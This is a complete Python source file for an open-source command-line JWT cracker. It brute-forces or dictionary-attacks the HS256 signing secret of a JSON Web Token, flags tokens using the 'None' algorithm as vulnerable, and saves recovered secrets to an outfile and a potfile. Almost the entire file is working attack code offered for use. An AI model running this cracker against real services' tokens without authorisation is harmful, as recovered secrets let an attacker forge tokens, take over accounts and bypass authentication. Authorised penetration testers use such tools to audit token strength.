#!/usr/bin/env python3
#    Copyright (C) 2017 - 2020 Alexandre Teyar

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
#    limitations under the License.

import argparse
import json
import logging
import os
import signal
import sys
import time
from datetime import datetime, timedelta
from itertools import chain, product

import coloredlogs
import jwt
from tqdm import tqdm

logger = logging.getLogger(__name__)
coloredlogs.install(level='DEBUG', milliseconds=True)


def parse_args():
    """This function parses the command line.

    Returns:
        [object] -- The parsed arguments
    """
    parser = argparse.ArgumentParser(
        description="A CPU-based JSON Web Token (JWT) cracker",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    subparsers = parser.add_subparsers(
        dest='attack_mode',
        title="Attack-mode"
    )
    subparsers.required = True

    brute_force_subparser = subparsers.add_parser(
        "brute-force",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )

    brute_force_subparser.add_argument(
        "-c", "--charset",
        default="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
        dest="charset",
        help="User-defined charset",
        type=str,
        required=False,
    )

    brute_force_subparser.add_argument(
        "--increment-min",
        default=1,
        dest="increment_min",
        help="Start incrementing at X",
        type=int,
        required=False,
    )

    brute_force_subparser.add_argument(
        "--increment-max",
        default=8,
        dest="increment_max",
        help="Stop incrementing at X",
        type=int,
        required=False,
    )

    cve_subparser = subparsers.add_parser(
        "vulnerable",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )

    wordlist__subparser = subparsers.add_parser(
        "wordlist",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )

    # Set the UTF-8 encoding and ignore error mode to avoid issues with the wordlist
    wordlist__subparser.add_argument(
        "-w", "--wordlist",
        default=argparse.SUPPRESS,
        dest="wordlist",
        help="Wordlist of private key candidates",
        required=True,
        type=argparse.FileType(
            'r',
            encoding='UTF-8',
            errors='ignore'
        )
    )

    parser.add_argument(
        "-lL", "--log-level",
        default=logging.INFO,
        dest="log_level",
        # TODO: Improve how to retrieve all log levels
        choices=[
            'DEBUG',
            'INFO',
        ],
        help="Set the logging level",
        type=str,
        required=False,
    )

    parser.add_argument(
        "-o", "--outfile",
        dest="outfile",
        help="Define outfile for recovered private keys",
        required=False,
        type=argparse.FileType(
            'w+',
            encoding='UTF-8',
            errors='ignore'
        )
    )

    parser.add_argument(
        "--potfile-disable",
        action='store_true',
        default=False,
        dest="potfile_disable",
        help="Do not write potfile",
        required=False,
    )

    parser.add_argument(
        "--potfile-path",
        default='jwtpot.potfile',
        dest="potfile",
        help="Specific path to potfile",
        required=False,
        type=argparse.FileType(
            'a+',
            encoding='UTF-8',
            errors='ignore'
        )
    )

    # parser.add_argument(
    #     "-tF", "--jwt-file",
    #     default=argparse.SUPPRESS,
    #     dest="token_file",
    #     help="File with JSON Web Tokens to attack",
    #     required=False,
    #     type=argparse.FileType(
    #         'r',
    #         encoding='UTF-8',
    #         errors='ignore'
    #     )
    # )

    parser.add_argument(
        default=argparse.SUPPRESS,
        dest="token",
        help="JSON Web Token to attack",
        type=str
    )

    return parser.parse_args()


def bruteforce(charset, minlength, maxlength):
    """This function generates all the different possible combination in a given character space.

    Arguments:
        charset {string} -- The charset used to generate all possible candidates
        minlength {integer} -- The minimum length for candiates generation
        maxlength {integer} -- The maximum length for candiates generation

    Returns:
        [type] -- All the possible candidates
    """
    return (''.join(candidate)
            for candidate in chain.from_iterable(product(charset, repeat=i)
                                                 for i in range(minlength, maxlength + 1)))


def run(token, candidate):
    """This function checks if a candidate can decrypt a JWT token.

    Arguments:
        token {string} -- An encrypted JWT token to test
        candidate {string} -- A candidate word for decoding

    Returns:
        [boolean] -- Result of the decoding attempt
    """
    try:
        payload = jwt.decode(token, candidate, algorithm='HS256')
        return True

    except jwt.exceptions.DecodeError:
        logger.debug(f"DecodingError: {candidate}")
        return False
    except jwt.exceptions.InvalidTokenError:
        logger.debug(f"InvalidTokenError: {candidate}")
        return False
    except Exception as ex:
        logger.exception(f"Exception: {ex}")
        sys.exit(1)


def is_vulnerable(args):
    """This function checks a JWT token against a well-known vulnerabilities.

    Arguments:
        args {object} -- The command-line arguments
    """
    headers = jwt.get_unverified_header(args.token)

    if headers['alg'] == "HS256":
        logging.info("JWT vulnerable to HS256 guessing attacks")
    elif headers['alg'] == "None":
        logging.info("JWT vulnerable to CVE-2018-1000531")


def hs256_attack(args):
    """This function passes down different candidates to the run() function and is required
    to handle different types of guessing attack.

    Arguments:
        args {object} -- The command-line arguments
    """
    headers = jwt.get_unverified_header(args.token)

    if not headers['alg'] == "HS256":
        logging.error("JWT signed using an algorithm other than HS256.")
    else:
        tqdm_disable = True if args.log_level == "DEBUG" else False

        if args.attack_mode == "brute-force":
            # Count = ....
            for candidate in tqdm(bruteforce(args.charset, args.increment_min, args.increment_max), disable=tqdm_disable):
                if run(args.token, candidate):
                    return candidate

            return None

        elif args.attack_mode == "wordlist":
            word_count = len(open(args.wordlist.name, "r",
                                  encoding="utf-8").readlines())
            for entry in tqdm(args.wordlist, disable=tqdm_disable, total=word_count):
                if run(args.token, entry.rstrip()):
                    return entry.rstrip()

            return None


def main():
    try:
        args = parse_args()
        logger.setLevel(args.log_level)

        start_time = time.time()

        if args.attack_mode == "vulnerable":
            is_vulnerable(args)
        elif args.attack_mode in ('brute-force', 'wordlist'):
            logger.warning(
                "For attacking complex JWT, it is best to use compiled, GPU accelerated password crackers such as Hashcat and John the Ripper which offer more advanced techniques such as raw brute forcing, rules-based, and mask attacks.")
            logger.info(
                "Pour yourself a cup (or two) of ☕ as this operation might take a while depending on the size of your wordlist.")

            candidate = hs256_attack(args)

            if candidate:
                logger.info(f"Private key found: {candidate}")

                if args.outfile:
                    args.outfile.write(f"{args.token}:{candidate}\n")
                    logging.info(f"Private key saved to: {args.outfile.name}")

                # Save the private secret into a file in case sys.stdout is unresponsive
                if not args.potfile_disable:
                    args.potfile.write(f"{args.token}:{candidate}\n")
            else:
                logger.info(
                    "The private key was not found in this wordlist. Consider using a bigger wordlist or other types of attacks.")

        end_time = time.time()
        elapsed_time = end_time - start_time
        logger.info(f"Finished in {elapsed_time} sec")

    except KeyboardInterrupt:
        logger.error("CTRL+C pressed, exiting...")

        # Not sure if necessary
        # args.wordlist.close()

        elapsed_time = time.time() - start_time
        logger.info(f"Interrupted after {elapsed_time} sec")

    except Exception as e:
        logger.error(f"{e}")


if __name__ == "__main__":
    main()
